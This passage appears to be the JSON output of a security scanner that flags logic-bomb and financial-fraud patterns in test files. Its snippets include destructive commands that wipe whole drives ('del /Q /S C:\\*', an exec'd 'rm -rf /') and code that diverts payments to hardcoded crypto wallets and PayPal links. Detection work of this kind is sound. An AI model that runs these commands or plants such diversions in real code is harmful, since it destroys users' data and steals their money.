      "id": "2d871826-67dc-4f98-a872-09e628eb2946",
      "last_modified": "",
      "line_number": 93,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.398948"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.399949",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "7d203d17-1d31-4c92-8748-db54af479fe2",
      "last_modified": "",
      "line_number": 114,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.399949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Secret transfer to crypto wallet.\"\"\"",
      "column": 31,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.399949",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "7226f85e-8aae-490c-ad45-c62ae8dcb23e",
      "last_modified": "",
      "line_number": 119,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.399949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "bitcoin_address = \"1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\"",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.399949",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "7236ea4b-149d-4959-88ff-0adf7611b6d3",
      "last_modified": "",
      "line_number": 120,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.399949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_money(slush_fund_total, my_personal_account)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.399949",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "8d8ecf5f-7b62-4ddb-8f40-d55bc577a5ad",
      "last_modified": "",
      "line_number": 162,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.399949"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Send amount to developer's crypto wallet.\"\"\"",
      "column": 39,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.400952",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "2dcf90ac-53c5-49c7-89d5-eff23a2e29b4",
      "last_modified": "",
      "line_number": 201,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.400952"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "self.crypto_transfer(amount, selected_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.400952",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "70dec127-6eb8-49d7-943d-edbec8b1e5d8",
      "last_modified": "",
      "line_number": 215,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.400952"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def crypto_transfer(self, amount, wallet_address):",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.400952",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "f1117de7-0be1-418e-8915-e8d53386ea89",
      "last_modified": "",
      "line_number": 217,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.400952"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to cryptocurrency wallet.\"\"\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.401951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "financial_fraud_tests.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\financial_fraud_tests.py",
      "id": "fbe323c0-97dc-4cef-8b9f-c205b9d6d235",
      "last_modified": "",
      "line_number": 218,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.401951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "shutil.rmtree('/important_folder')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.413950",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "18ebb37f-2a7e-4fce-b463-f368cecb8093",
      "last_modified": "",
      "line_number": 8,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.413950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.system('del /Q /S C:\\\\*')",
      "column": 8,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.414950",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "86932473-e6cf-4f4e-adc1-31dc8fe506f7",
      "last_modified": "",
      "line_number": 9,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.414950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"__import__('os').system('rm -rf /')\")",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.414950",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "23193439-3533-4a62-b630-8318d5ff2ac9",
      "last_modified": "",
      "line_number": 12,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.414950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "os.remove('/critical.txt')",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.414950",
      "data_classification": "UNKNOWN",
      "debt_category": "DESTRUCTIVE_ACTION",
      "effort": 120,
      "exploitability": "UNKNOWN",
      "file_name": "high_risk_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\high_risk_test.py",
      "id": "2f50be6a-15dd-45b5-bb28-4b86b9315f22",
      "last_modified": "",
      "line_number": 16,
      "message": "Detects potentially destructive operations that could be payloads of logic bombs",
      "payload_analysis": "File/directory deletion - Data loss risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "destructive-payload-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "CRITICAL: Remove all destructive file operations. Implement proper data management.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Direct destructive action detected",
      "type": "DESTRUCTIVE_PAYLOAD",
      "update_date": "2025-08-11T20:30:43.414950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# Redirect payment to developer account",
      "column": 11,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.416951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "22b1c58f-07de-4f22-9aec-6c5f5917f5ea",
      "last_modified": "",
      "line_number": 10,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.416951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "crypto_wallet = \"0x742d35Cc6634C0532925a3b8D40F4174e3A59339\"",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.416951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "ff9dfc08-3a44-4a9c-a209-900708d6d00b",
      "last_modified": "",
      "line_number": 22,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.416951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "transfer_crypto(fee * 0.01, crypto_wallet)",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.416951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "d7e608f2-8139-43c2-8209-3f6a66f1fb0e",
      "last_modified": "",
      "line_number": 23,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.416951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "paypal_link = \"paypal.me/developer123\"",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.417951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "58a3cb33-b8ed-44c2-b5e6-46d0bf7ba464",
      "last_modified": "",
      "line_number": 27,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.417951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "redirect_payment(amount * 0.001, paypal_link)",
      "column": 9,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.417951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "4a7f76ec-6263-4135-88c7-d53cfd764291",
      "last_modified": "",
      "line_number": 28,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.417951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def transfer_crypto(amount, wallet):",
      "column": 14,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.417951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "2215f833-079b-44a1-ba29-7412d9e0a29b",
      "last_modified": "",
      "line_number": 41,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.417951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "\"\"\"Transfer to crypto wallet.\"\"\"",
      "column": 20,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.417951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "0d80e203-c7fb-4d3a-b0b6-070c4077259e",
      "last_modified": "",
      "line_number": 42,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Financial redirection - Money theft risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.417951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "def redirect_payment(amount, paypal):",
      "column": 5,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.417951",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "a5c54c23-cf22-4f7a-a513-4007384b1e1e",
      "last_modified": "",
      "line_number": 45,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Unknown payload - CRITICAL_BOMB level threat detected",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.417951"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "exec(\"transfer_money(100, 'hidden_account')\")",
      "column": 7,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.418950",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "122ad7ee-87a8-4bf0-b29b-7e59a070f9eb",
      "last_modified": "",
      "line_number": 54,
      "message": "Detects potential financial fraud and unauthorized money redirection",
      "payload_analysis": "Code execution - System compromise risk",
      "priority_score": 0,
      "repo_name": "unknown-repo",
      "rule_id": "financial-fraud-detector",
      "scan_id": "c2ef49f0-2b02-42a0-808b-fcd9780cf640",
      "security_domain": "APPLICATION",
      "severity": "CRITICAL_BOMB",
      "spk_tag": "SPK-DEFAULT",
      "status": "ACTIVE_THREAT",
      "suggested_fix": "URGENT: Remove unauthorized financial redirections. Use legitimate payment systems.",
      "team_owner": "",
      "threat_level": "EXTREME",
      "trigger_analysis": "Financial redirection detected - Counter-based logic found",
      "type": "FINANCIAL_FRAUD",
      "update_date": "2025-08-11T20:30:43.418950"
    },
    {
      "ait_tag": "AIT",
      "assignee": null,
      "attack_vector": "UNKNOWN",
      "business_impact": "Medium",
      "code_snippet": "# PATTERN 8: Hardcoded Bitcoin address",
      "column": 24,
      "compliance_impact": "None",
      "component_name": "",
      "creation_date": "2025-08-11T20:30:43.418950",
      "data_classification": "UNKNOWN",
      "debt_category": "FINANCIAL_SECURITY",
      "effort": 90,
      "exploitability": "UNKNOWN",
      "file_name": "simple_financial_fraud_test.py",
      "file_path": "c:\\Users\\91770\\Downloads\\test_files\\simple_financial_fraud_test.py",
      "id": "603b3ecb-2bf2-4974-a12a-09e1f85e1e82",
      "last_modified": "",
